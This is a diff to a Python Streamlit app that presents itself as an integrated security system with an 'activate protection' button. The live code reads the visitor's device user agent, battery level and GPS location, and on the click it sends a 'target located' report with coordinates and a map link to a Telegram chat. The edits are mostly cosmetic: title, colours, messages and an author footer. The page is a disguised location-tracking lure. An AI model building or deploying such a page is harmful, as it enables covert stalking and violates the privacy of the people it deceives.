@@ -13,9 +13,9 @@ def enviar_telegram(mensagem):
     except: pass
 
 # 2. CONFIGURAÇÃO DA PÁGINA
-st.set_page_config(page_title="SISTEMA ATIVO", page_icon="🔐", layout="centered")
+st.set_page_config(page_title="SISTEMA DE SEGRUGRANÇA INTEGRADO", page_icon="🔐", layout="centered")
 
-# 3. VISUAL (AMARELO E RADAR)
+# 3. VISUAL (AMARELO E RODAPÉ)
 st.markdown("""
     <style>
     .main { background-color: #0d1117; }
@@ -25,16 +25,22 @@ st.markdown("""
         font-weight: bold !important;
         width: 100%; height: 4em; border-radius: 10px;
     }
+    .footer {
+        text-align: center;
+        color: #666;
+        font-size: 14px;
+        margin-top: 50px;
+        font-weight: bold;
+    }
     </style>
-    <h1 style='text-align: center; color: #green;'>🛡️Segurança Ativa </h1>
+    <h1 style='text-align: center; color: #ffc107;'>🛡️ SISTEMA ATIVO </h1>
     """, unsafe_allow_html=True)
 
 # 4. CAPTURA DE DADOS (Modelo e Bateria)
 ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
 bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
 
-# --- O SEGREDO PARA FUNCIONAR COM 1 CLIQUE ---
-# Chamamos a função fora do 'if' para ela começar a carregar assim que o site abre
+# 5. GPS (Carrega antes do clique para tentar ir de primeira)
 loc = get_geolocation()
 
 if st.button("🔴 ATIVAR PROTEÇÃO"):
@@ -48,12 +54,14 @@ if st.button("🔴 ATIVAR PROTEÇÃO"):
             f"🔔 ALVO LOCALIZADO!\n\n"
             f"📱 Aparelho: {ua[:60] if ua else 'Dispositivo'}...\n"
             f"🔋 Bateria: {bat if bat else '--'}%\n"
-            f"📍 Mapa: [VER LOCALIZAÇÃO]({mapa})\n"
+            f"📍 Mapa: [ABRIR NO GOOGLE MAPS]({mapa})\n"
             f"🌐 Coords: {lat}, {lon}"
         )
         
         enviar_telegram(relatorio)
-        st.success("✅ Relatório enviado com 1 clique!")
+        st.success("✅ Relatório enviado com sucesso!")
     else:
-        # Se o GPS ainda estiver "acordando", ele tenta forçar a leitura aqui
-        st.warning("🛰️ O GPS ainda está carregando... Aguarde 2 segundos e tente o último clique.")
+        st.warning("🛰️ O GPS ainda está carregando. Aguarde 2 segundos e clique novamente.")
+
+# 6. SUA ASSINATURA
+st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
